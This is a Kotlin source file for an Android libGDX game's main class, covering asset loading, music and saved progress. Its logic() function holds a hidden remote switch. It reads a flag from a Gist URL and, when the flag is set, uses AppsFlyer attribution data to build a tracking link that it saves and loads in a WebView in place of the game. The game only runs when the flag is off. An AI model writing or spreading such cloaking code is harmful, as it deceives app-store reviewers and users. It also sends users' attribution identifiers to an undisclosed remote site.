package com.turkeypetmiss.turkeydevpetroller.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import androidx.core.content.edit
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.turkeypetmiss.turkeydevpetroller.MainActivity
import com.turkeypetmiss.turkeydevpetroller.appContext
import com.turkeypetmiss.turkeydevpetroller.game.dataStore.DS_Gel
import com.turkeypetmiss.turkeydevpetroller.game.dataStore.DS_Gold
import com.turkeypetmiss.turkeydevpetroller.game.dataStore.DS_IsTutorial
import com.turkeypetmiss.turkeydevpetroller.game.dataStore.DS_Level
import com.turkeypetmiss.turkeydevpetroller.game.dataStore.DS_PokupkiData
import com.turkeypetmiss.turkeydevpetroller.game.manager.MusicManager
import com.turkeypetmiss.turkeydevpetroller.game.manager.NavigationManager
import com.turkeypetmiss.turkeydevpetroller.game.manager.SoundManager
import com.turkeypetmiss.turkeydevpetroller.game.manager.SpriteManager
import com.turkeypetmiss.turkeydevpetroller.game.manager.util.MusicUtil
import com.turkeypetmiss.turkeydevpetroller.game.manager.util.SoundUtil
import com.turkeypetmiss.turkeydevpetroller.game.manager.util.SpriteUtil
import com.turkeypetmiss.turkeydevpetroller.game.screens.LoaderScreen
import com.turkeypetmiss.turkeydevpetroller.game.utils.GameColor
import com.turkeypetmiss.turkeydevpetroller.game.utils.advanced.AdvancedGame
import com.turkeypetmiss.turkeydevpetroller.game.utils.disposeAll
import com.turkeypetmiss.turkeydevpetroller.util.Gist
import com.turkeypetmiss.turkeydevpetroller.util.currentClassName
import com.turkeypetmiss.turkeydevpetroller.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.net.URLEncoder
import java.util.concurrent.atomic.AtomicBoolean

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isLoadAssets = false
var GDX_GLOBAL_isPauseGame  = false

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }


    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Prefs", MODE_PRIVATE)

    val ds_IsTutorial  = DS_IsTutorial(coroutine)
    val ds_PokupkiData = DS_PokupkiData(coroutine)
    val ds_Gold        = DS_Gold(coroutine)
    val ds_Gel         = DS_Gel(coroutine)
    val ds_Level       = DS_Level(coroutine)

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        logic()
    }

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)

            log("dispose $currentClassName")
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    override fun pause() {
        log("GDX pause")
        super.pause()
        GDX_GLOBAL_isPauseGame = true
        if (GDX_GLOBAL_isLoadAssets) musicUtil.currentMusic?.pause()
    }

    override fun resume() {
        log("GDX resume")
        super.resume()
        GDX_GLOBAL_isPauseGame = false
        if (GDX_GLOBAL_isLoadAssets) musicUtil.currentMusic?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun logic() {
        log("start logic")
        activity.webViewHelper.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.webViewHelper.initWeb()

        //GDX_GLOBAL_isGame = true
        //return

        val savedData = sharedPreferences.getString("finish_link", null)

        try {
            if (savedData != null) {
                activity.webViewHelper.loadUrl(savedData)
            } else {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson(activity.getGistURL()) }

                    log("json: $getJSON")

                    if (getJSON != null) {
                        if (getJSON.flag != "true") GDX_GLOBAL_isGame = true
                        else {
                            initAppsFly(getJSON.link, getJSON.key) { finishLink ->
                                log("Save and Open: $finishLink")
                                sharedPreferences.edit { putString("finish_link", finishLink) }
                                activity.webViewHelper.loadUrl(finishLink)
                            }
                        }
                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }

    }

    private fun initAppsFly(linkKT: String, devKey: String, successBlock: (String) -> Unit) {
        val flag = AtomicBoolean(true)

        AppsFlyerLib.getInstance().init(devKey, object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(conversion: MutableMap<String, Any>?) {
                if (flag.getAndSet(false).not()) return

                if (conversion == null) {
                    GDX_GLOBAL_isGame = true
                    return
                }

                coroutine.launch(Dispatchers.Main) {
                    try {
                        log("conversion: $conversion")

                        // 🔥 Скільки сабів хочеш підтримувати
                        val maxSubs = 10

                        val queryBuilder = StringBuilder()

                        for (i in 1..maxSubs) {
                            val key      = "af_sub$i"
                            val rawValue = conversion[key] // може бути null або відсутній ключ
                            val value    = rawValue?.toString() ?: ""
                            val encoded  = URLEncoder.encode(value, "UTF-8")
                            queryBuilder.append("sub_id_$i=$encoded&")
                        }

                        val finalQuerySubs = queryBuilder.toString().removeSuffix("&")
                        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                        log("""
                            af_id = $afId
                            subs = $finalQuerySubs
                        """.trimIndent())

                        val finishLink = "$linkKT?$finalQuerySubs&af_id=$afId"

                        log("Finish link: $finishLink")
                        successBlock(finishLink)

                    } catch (e: Exception) {
                        log("error: ${e.message}")
                        GDX_GLOBAL_isGame = true
                    }
                }
            }

            override fun onConversionDataFail(p0: String?) {
                flag.set(false)
                GDX_GLOBAL_isGame = true
            }
            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
            override fun onAttributionFailure(p0: String?) {}
        }, appContext)

        AppsFlyerLib.getInstance().start(activity, devKey, object : AppsFlyerRequestListener {
            override fun onSuccess() { log("AppsFly onSuccess") }
            override fun onError(p0: Int, p1: String) {
                log("AppsFly onError")
                GDX_GLOBAL_isGame = true
            }
        })
    }

}

